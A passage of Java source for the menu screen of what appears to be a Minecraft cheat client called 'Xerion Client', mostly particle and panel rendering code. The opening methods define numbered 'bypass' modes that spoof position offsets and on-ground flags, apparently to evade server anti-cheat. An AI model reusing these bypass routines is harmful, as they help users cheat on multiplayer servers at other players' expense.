        case 2->Math.sin(i*.3)*.08;
        case 3->(i%5==0)?.0625:(i%3==0)?.03125:(i%2==0)?rng.nextDouble()*.004:0;
        case 4->(i%4==0)?.1:(i%4==1)?.05:(i%4==2)?.025:0;
        case 5->(i%14==0)?.0625:(i%7==0)?.03125:rng.nextDouble()*.006;
        case 6->(i%18==0)?.0625:rng.nextDouble()*.003;
        case 7->(i%28==0)?.0312:rng.nextDouble()*.001;
        case 8->Math.sin(i*.17)*.055+Math.cos(i*.43)*.028+((i%11==0)?.03125:0);
        case 9->Math.sin(i*.15)*.12+Math.cos(i*.31)*.065+((i%5==0)?.0625:0)+rng.nextDouble()*.01;
        default->0;
    };}
    private double bypassX(int i){return switch(bypass){case 5,8->rng.nextGaussian()*.003;case 9->Math.sin(i*.19)*.006+rng.nextGaussian()*.004;default->0;};}
    private double bypassZ(int i){return switch(bypass){case 5,8->rng.nextGaussian()*.003;case 9->Math.cos(i*.22)*.006+rng.nextGaussian()*.004;default->0;};}
    private boolean bypassGround(int i){return switch(bypass){case 3->i%4!=1;case 5->i%14!=0;case 7->i%28!=0;case 8->i%11!=0;case 9->i%5!=0;default->true;};}

    private void triggerBurst(){
        for(int i=0;i<110;i++){float ang=(float)(rng.nextFloat()*Math.PI*2);float sp=rng.nextFloat()*8+2;burst2.add(new float[]{width/2f,height/2f,(float)(Math.cos(ang)*sp),(float)(Math.sin(ang)*sp),rng.nextFloat()*50+20,1f,(float)rng.nextInt(4)});}
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  RENDER
    // ═══════════════════════════════════════════════════════════════════════
    @Override
    public void render(DrawContext ctx, int mx, int my, float delta) {
        tick++;
        tabSlide=Math.min(1f,tabSlide+.09f);
        glow+=glowUp?.030f:-.030f; if(glow>=1f){glow=1f;glowUp=false;}else if(glow<=0f){glow=0f;glowUp=true;}
        hue=(hue+.0035f)%1f; scanA=(scanA+2.2f)%height;
        hexOff+=.015f; snowDrift+=.01f;
        for(int i=0;i<NT;i++) tabGlow[i]=Math.max(0f,tabGlow[i]-(i==tab?0f:.048f));
        tabGlow[tab]=Math.min(1f,tabGlow[tab]+.09f);
        if(statusTimer>0)statusTimer--;

        float hypeTarget=ProfessorMusicManager.getHypeLevel();
        hypeSmooth=hypeSmooth*.88f+hypeTarget*.12f;
        float hype=hypeSmooth;

        int W=width,H=height,cx=W/2,cy=H/2;
        int bpx=cx-PW/2,bpy=cy-PH/2;

        // ── BACKGROUND ────────────────────────────────────────────────────
        ctx.fill(0,0,W,H,BG);

        // Subtle grid
        for(int x=0;x<W;x+=44){int a=7;ctx.fill(x,0,x+1,H,(a<<24)|0x113355);}
        for(int y=0;y<H;y+=44){int a=7;ctx.fill(0,y,W,y+1,(a<<24)|0x113355);}

        // Data streams (faint ice)
        for(int i=0;i<65;i++){dsY[i]+=dsSp[i]*(1f+hype*1.8f);if(dsY[i]>H+20){dsY[i]=-24;dsCh[i]=rng.nextInt(DS.length());}if(rng.nextInt(20)==0)dsCh[i]=rng.nextInt(DS.length());if(dsY[i]<0)continue;int da=(int)(38+22*glow+(int)(45*hype));ctx.drawText(textRenderer,String.valueOf(DS.charAt(dsCh[i])),(int)dsX[i]-4,(int)dsY[i],(Math.min(255,da*2)<<24)|0x3399BB,false);}

        // ── SNOW (white, bright, prominent) ───────────────────────────────
        float pspeed=1f+hype*2f;
        for(int i=0;i<SCNT;i++){
            sy[i]+=ssp[i]*pspeed; sx[i]+=(float)Math.sin(snowDrift+sph[i])*.42f; sph[i]+=.007f;
            if(sy[i]>H+6){sy[i]=-6;sx[i]=rng.nextFloat()*W;}
            if(sx[i]<-6)sx[i]=W+5; if(sx[i]>W+5)sx[i]=-6;
            float tw=(MathHelper.sin(sph[i])+1f)/2f;
            int a=(int)(sal[i]*(0.5f+0.5f*tw)*255); if(a<12) continue;
            int sz=(int)ssz[i];
            int col=ssz[i]>3.5f?SNOW_W:ssz[i]>2.5f?SNOW_B:0xFFAABBCC;
            ctx.fill((int)sx[i],(int)sy[i],(int)sx[i]+sz,(int)sy[i]+sz,wa(col,a));
            if(sz>=3&&a>140) ctx.fill((int)sx[i]+1,(int)sy[i]+1,(int)sx[i]+sz-1,(int)sy[i]+sz-1,wa(SNOW_W,Math.min(255,a+50)));
        }
        // Sparkles
        for(int i=0;i<GPCNT;i++){gpp[i]+=.05f;float tw=(MathHelper.sin(gpp[i])+1f)/2f;if(tw<0.65f)continue;int a=(int)((tw-.65f)*2.86f*200);if(a<20)continue;int sz=(int)gps[i];ctx.fill((int)gpx[i]-sz,(int)gpy[i],(int)gpx[i]+sz,(int)gpy[i]+1,wa(SNOW_W,a));ctx.fill((int)gpx[i],(int)gpy[i]-sz,(int)gpx[i]+1,(int)gpy[i]+sz,wa(SNOW_W,a));}

        // ── Particles (ice) ───────────────────────────────────────────────
        for(int i=0;i<PCNT;i++){ppx[i]+=pvx[i]*pspeed;ppy[i]+=pvy[i]*pspeed;pph[i]+=.043f;if(ppy[i]<-8){ppy[i]=H+5;ppx[i]=rng.nextFloat()*W;}if(ppx[i]<0)ppx[i]=W;if(ppx[i]>W)ppx[i]=0;float tw=(MathHelper.sin(pph[i])+1f)/2f;int a=(int)(pal[i]*tw*200);if(a<10)continue;int col=switch(pct[i]){case 1->(a<<24)|0x00CCEE;case 2->(a<<24)|0xDDF8FF;case 3->(a<<24)|GOLD;case 4->(a<<24)|0x004466;default->(a<<24)|0x88EEFF;};int sz=psz[i]>2.5f?2:1;ctx.fill((int)ppx[i],(int)ppy[i],(int)ppx[i]+sz,(int)ppy[i]+sz,col);}

        // ── Hype burst ────────────────────────────────────────────────────
        burst2.removeIf(b->b[5]<=0f);
        for(float[] b:burst2){b[0]+=b[2];b[1]+=b[3];b[3]+=.13f;b[5]-=.02f;int ba=(int)(b[5]*200);if(ba<10)continue;int bc=switch((int)b[6]){case 1->wa(GOLD,ba);case 2->wa(RED,ba);case 3->wa(0xFFEEF8FF,ba);default->wa(BORDER2,ba);};ctx.fill((int)b[0],(int)b[1],(int)b[0]+3,(int)b[1]+3,bc);}

        // Scanline (very faint)
        ctx.fill(0,(int)scanA,W,(int)scanA+1,0x07FFFFFF);

        // Hype vignette
        if(hype>0.6f){int hva=(int)((hype-.6f)*2.5f*65);if(hva>0&&hva<256)ctx.fill(0,0,W,H,(hva<<24)|0x001133);}

        // ── Mouse trail ───────────────────────────────────────────────────
        if(mx!=lastMx||my!=lastMy){trail.add(new TrailPt(mx,my,TC[tab],1f));for(int i=0;i<4;i++){int sx2=mx+(int)((rng.nextFloat()-.5f)*15),sy2=my+(int)((rng.nextFloat()-.5f)*15);trail.add(new TrailPt(sx2,sy2,i%2==0?GOLD:SNOW_W,.45f));}lastMx=mx;lastMy=my;}
        trail.replaceAll(t->new TrailPt(t.x(),t.y(),t.color(),(float)(t.life()-.04)));
        trail.removeIf(t->t.life()<=0f);
        for(TrailPt t:trail){int ta=(int)(t.life()*t.life()*160);if(ta<10)continue;ctx.fill(t.x()-1,t.y()-1,t.x()+2,t.y()+2,(ta<<24)|(t.color()));}

        // ── Panel shadow ──────────────────────────────────────────────────
        ctx.fill(bpx+12,bpy+12,bpx+PW+12,bpy+PH+12,wa(0xFF000000,150));
        ctx.fill(bpx+6, bpy+6, bpx+PW+6, bpy+PH+6, wa(0xFF000000,60));

        // ── Panel body — SOLID OPAQUE DARK ICE ────────────────────────────
        ctx.fill(bpx,bpy,bpx+PW,bpy+PH,PANEL_BG);
        // Top shimmer
        for(int y=0;y<50;y++){int ga=(int)((1f-y/50f)*18);if(ga>0)ctx.fill(bpx,bpy+y,bpx+PW,bpy+y+1,(ga<<24)|0xAADDFF);}

        // ── BORDER — 5px SOLID BRIGHT ICE ─────────────────────────────────
        float hrad=hue*6.28f;
        int bR=Math.max(0,Math.min(255,(int)(70+55*Math.abs(Math.sin(hrad)))));
        int bG=Math.max(180,Math.min(255,(int)(210+45*Math.sin(hrad+1.6f))));
        int bA2=Math.min(255,(int)((0.90f+.10f*glow+.15f*hype)*255));
        int borderC=(bA2<<24)|(bR<<16)|(bG<<8)|0xFF;
        // Outer glow
        int ogA=(int)(0.25f*glow*255); if(ogA>0){ctx.fill(bpx-4,bpy-4,bpx+PW+4,bpy+1,wa(BORDER,ogA));ctx.fill(bpx-4,bpy+PH-1,bpx+PW+4,bpy+PH+4,wa(BORDER,ogA));ctx.fill(bpx-4,bpy-4,bpx+1,bpy+PH+4,wa(BORDER,ogA));ctx.fill(bpx+PW-1,bpy-4,bpx+PW+4,bpy+PH+4,wa(BORDER,ogA));}
        // Solid 5px
        ctx.fill(bpx,     bpy,     bpx+PW,  bpy+5,    borderC);
        ctx.fill(bpx,     bpy+PH-5,bpx+PW,  bpy+PH,   borderC);
        ctx.fill(bpx,     bpy,     bpx+5,   bpy+PH,   borderC);
        ctx.fill(bpx+PW-5,bpy,     bpx+PW,  bpy+PH,   borderC);
        // Inner highlight
        int ihA=(int)(0.50f*255); ctx.fill(bpx+5,bpy+5,bpx+PW-5,bpy+6,wa(TITLE1,ihA));ctx.fill(bpx+5,bpy+PH-6,bpx+PW-5,bpy+PH-5,wa(TITLE1,ihA));ctx.fill(bpx+5,bpy+5,bpx+6,bpy+PH-5,wa(TITLE1,ihA));ctx.fill(bpx+PW-6,bpy+5,bpx+PW-5,bpy+PH-5,wa(TITLE1,ihA));

        // Gold corners
        drawCorner(ctx,bpx,bpy,bpx+PW,bpy+PH,34,wa(GOLD,(int)(0.95f*255)));

        // ── Title bar ─────────────────────────────────────────────────────
        ctx.fill(bpx,bpy,bpx+PW,bpy+TH,wa(0xFF001830,(int)(200)));
        String t1="XERION",t2=" CLIENT";
        int tw1=textRenderer.getWidth(t1),tw2=textRenderer.getWidth(t2);
        int tx=cx-(tw1+tw2)/2,ty=bpy+10;
        int glA=(int)(55+40*glow+(int)(hype*20));
        for(int d=-6;d<=6;d++){int ga=Math.max(0,glA-Math.abs(d)*8);if(ga>0){ctx.drawText(textRenderer,t1+t2,tx+d,ty,(ga<<24)|0x00CCFF,false);ctx.drawText(textRenderer,t1+t2,tx,ty+d,(ga<<24)|0x00CCFF,false);}}
        int tA=Math.min(255,(int)(225+30*glow+(int)(30*hype)));
        ctx.drawText(textRenderer,t1,tx,ty,wa(TITLE1,tA),false);
        ctx.drawText(textRenderer,t2,tx+tw1,ty,wa(TITLE2,tA),false);
        String sub="v2.0  ❄  7 Modules  ❄  10 Bypass + 8 Advanced  ❄  Xerion";
        ctx.drawText(textRenderer,sub,cx-textRenderer.getWidth(sub)/2,ty+12,wa(CRYSTAL,(int)(165+55*glow)),false);

        // Divider
        ctx.fill(bpx+28,bpy+TH-2,bpx+PW-28,bpy+TH-1,wa(GOLD,(int)(140)));

        // ── Tab bar ───────────────────────────────────────────────────────
        ctx.fill(bpx,bpy+TH,bpx+PW,bpy+TH+TABH+12,wa(0xFF001830,200));
        int tabW2=(PW-12)/NT;
        for(int i=0;i<NT;i++){int tg2=(int)(tabGlow[i]*255);if(tg2>0){ctx.fill(bpx+6+i*(tabW2+1),bpy+TH,bpx+6+(i+1)*(tabW2+1)-1,bpy+TH+TABH+12,(tg2/4<<24)|TC[i]);ctx.fill(bpx+6+i*(tabW2+1),bpy+TH+TABH+8,bpx+6+(i+1)*(tabW2+1)-1,bpy+TH+TABH+12,(tg2<<24)|TC[i]);}}
        ctx.fill(bpx+6,bpy+TH+TABH+11,bpx+PW-6,bpy+TH+TABH+12,wa(BORDER2,180));

        // ── Music hype bar ────────────────────────────────────────────────
        if(ProfessorMusicManager.isPlaying(client)){
            int mbw=PW-80,mbx=bpx+40,mby=bpy+PH-56;
            String ml="❄ ♪  "+MSGS_MUSIC[Math.min(MSGS_MUSIC.length-1,(int)(ProfessorMusicManager.getVisualProgress()*MSGS_MUSIC.length))];
            ctx.drawText(textRenderer,ml,mbx,mby-12,wa(TXT_ICE,180),false);
            ctx.fill(mbx-2,mby-2,mbx+mbw+2,mby+7,wa(BORDER,150));
            ctx.fill(mbx,mby,mbx+mbw,mby+5,wa(0xFF010E1E,255));
            int hfw=(int)(mbw*hype);
            for(int xi=0;xi<hfw;xi++){float fr=(float)xi/mbw;int r=(int)MathHelper.lerp(fr,10f,160f);int g=(int)MathHelper.lerp(fr,80f,235f);ctx.fill(mbx+xi,mby,mbx+xi+1,mby+5,0xFF000000|(r<<16)|(g<<8)|255);}
        }

        // ── Right info sidebar ────────────────────────────────────────────
        drawSidebar(ctx,bpx+PW-158,bpy+TH+TABH+18,152,PH-TH-TABH-82);

        // ── Status bar ────────────────────────────────────────────────────
        if(statusTimer>0){
            int a=Math.min(255,statusTimer*2);
            ctx.fill(bpx+6,bpy+PH-44,bpx+PW-6,bpy+PH-26,wa(0xFF001830,220));
            ctx.fill(bpx+6,bpy+PH-44,bpx+11,bpy+PH-26,wa(GOLD,a));
            ctx.fill(bpx+PW-11,bpy+PH-44,bpx+PW-6,bpy+PH-26,wa(GOLD,a));
            ctx.drawText(textRenderer,statusText,cx-textRenderer.getWidth(statusText)/2,bpy+PH-38,wa(statusColor&0xFFFFFF,a),false);
        }

        // Footer
        ctx.fill(bpx,bpy+PH-22,bpx+PW,bpy+PH,wa(0xFF001830,180));
        ctx.drawText(textRenderer,"❄  Xerion Client  |  Frost Edition  |  Use responsibly  ❄",cx-textRenderer.getWidth("❄  Xerion Client  |  Frost Edition  |  Use responsibly  ❄")/2,bpy+PH-15,wa(TXT_DIM,160),false);

        super.render(ctx,mx,my,delta);
    }

    private static final String[] MSGS_MUSIC={"Intro","Building...","Verse","Pre-chorus","DROP !","Chorus","Bridge","Final"};

    private void drawSidebar(DrawContext ctx,int x,int y,int w,int h){
        // Solid background
        ctx.fill(x,y,x+w,y+h,wa(0xFF011828,220));
        // Border
        ctx.fill(x,y,x+w,y+2,wa(BORDER2,200)); ctx.fill(x,y+h-2,x+w,y+h,wa(BORDER2,200));
        ctx.fill(x,y,x+2,y+h,wa(BORDER2,200)); ctx.fill(x+w-2,y,x+w,y+h,wa(BORDER2,200));
        ctx.drawText(textRenderer,"❄  INFO",x+6,y+6,wa(TXT_ICE,220),false);
        ctx.fill(x,y+15,x+w,y+16,wa(BORDER2,100));
        String[] lines={"Bypass: "+BP[bypass],"Delay: "+delay+"ms","Burst: "+burst+"x","Speed: "+speed+"x","Mode: "+(unlimited?"∞ UNL":"COUNT"),"Hype: "+(int)(hypeSmooth*100)+"%","Tab: "+TABS[tab]};
        for(int i=0;i<lines.length;i++) ctx.drawText(textRenderer,lines[i],x+6,y+20+i*13,wa(TXT_BRIGHT,200),false);
        // Drop bar
        int iy=y+h-24;
        ctx.drawText(textRenderer,"DROP",x+6,iy-12,wa(TXT_ICE,160),false);
        ctx.fill(x+4,iy,x+w-4,iy+8,wa(BORDER2,60));
        int fw2=(int)((w-8)*hypeSmooth);
        if(fw2>0) ctx.fill(x+4,iy,x+4+fw2,iy+8,wa(hypeSmooth>.7f?RED:BORDER2,(int)((0.8f+.2f*hypeSmooth)*255)));
        // Status dot
        int da=(int)((0.5f+.5f*glow)*255);
        ctx.fill(x+w-10,y+6,x+w-5,y+11,wa(hypeSmooth>.6f?RED:GREEN,da));
    }

    @Override public boolean mouseClicked(double mx,double my,int btn){
        if(btn==0)cs();
        if(numField!=null)numField.mouseClicked(mx,my,btn);
        if(chatField!=null)chatField.mouseClicked(mx,my,btn);
        return super.mouseClicked(mx,my,btn);
    }
    @Override public boolean keyPressed(int k,int sc,int mod){if(numField!=null&&numField.isFocused()&&numField.keyPressed(k,sc,mod))return true;if(chatField!=null&&chatField.isFocused()&&chatField.keyPressed(k,sc,mod))return true;return super.keyPressed(k,sc,mod);}
    @Override public boolean charTyped(char c,int mod){if(numField!=null&&numField.isFocused()&&numField.charTyped(c,mod))return true;if(chatField!=null&&chatField.isFocused()&&chatField.charTyped(c,mod))return true;return super.charTyped(c,mod);}

    // ── Helpers ──────────────────────────────────────────────────────────
    private static int wa(int rgb,int a){return(Math.max(0,Math.min(255,a))<<24)|(rgb&0x00FFFFFF);}
    private static void drawCorner(DrawContext ctx,int x1,int y1,int x2,int y2,int cs,int col){ctx.fill(x1,y1,x1+cs,y1+5,col);ctx.fill(x1,y1,x1+5,y1+cs,col);ctx.fill(x2-cs,y1,x2,y1+5,col);ctx.fill(x2-5,y1,x2,y1+cs,col);ctx.fill(x1,y2-5,x1+cs,y2,col);ctx.fill(x1,y2-cs,x1+5,y2,col);ctx.fill(x2-cs,y2-5,x2,y2,col);ctx.fill(x2-5,y2-cs,x2,y2,col);}
}
